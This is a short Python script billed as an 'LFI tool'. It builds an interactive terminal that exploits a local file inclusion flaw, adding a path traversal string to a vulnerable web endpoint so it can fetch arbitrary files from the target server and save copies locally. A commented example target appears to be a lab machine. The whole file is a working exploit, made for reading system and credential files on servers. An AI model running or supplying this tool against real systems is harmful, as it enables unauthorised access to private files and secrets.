import requests
import os
from pathlib import Path
from cmd import Cmd
import argparse
import sys


class terminal(Cmd):

    prompt = "LFI > "

    def __init__(self, url, port, endpoint, completekey='tab', stdin=None, stdout=None):
        self.target = f'{url}:{port}/{endpoint}../../../../../../../../'
        super().__init__(completekey='tab', stdin=None, stdout=None)

    def default(self, filename):
        content = self.get_file(filename)
        print(content)
        self.save_file(filename, content)
        
    def get_file(self, filename):
        req = requests.get(f'{self.target}{filename}')
        return req.text

    def save_file(self, filename, content):
        if len(filename) <= 0:
            return 0
        try:
            os.makedirs(f'{os.getcwd()}/{Path(filename).parent}')
        except:
            pass
        with open(f'{os.getcwd()}/{filename}', 'w+') as f:
            f.write(content)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='LFI tool')
    parser.add_argument('host', type=str, help='Hostname or IP of target')
    parser.add_argument('port', type=int, help='Port of the webserver')
    parser.add_argument('endpoint', type=str, help='The vulnerable endpoint (example: "news.php?file=")')

    if sys.argv == 1:
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()

    t = terminal(url=args.host, port=args.port, endpoint=args.endpoint)
    t.intro = '~ LFI Terminal ~\nPress Ctrl+C to exit\n'
    t.cmdloop()
    #().cmdloop()

#
#URL = 'http://10.10.10.194:80/news.php?file='
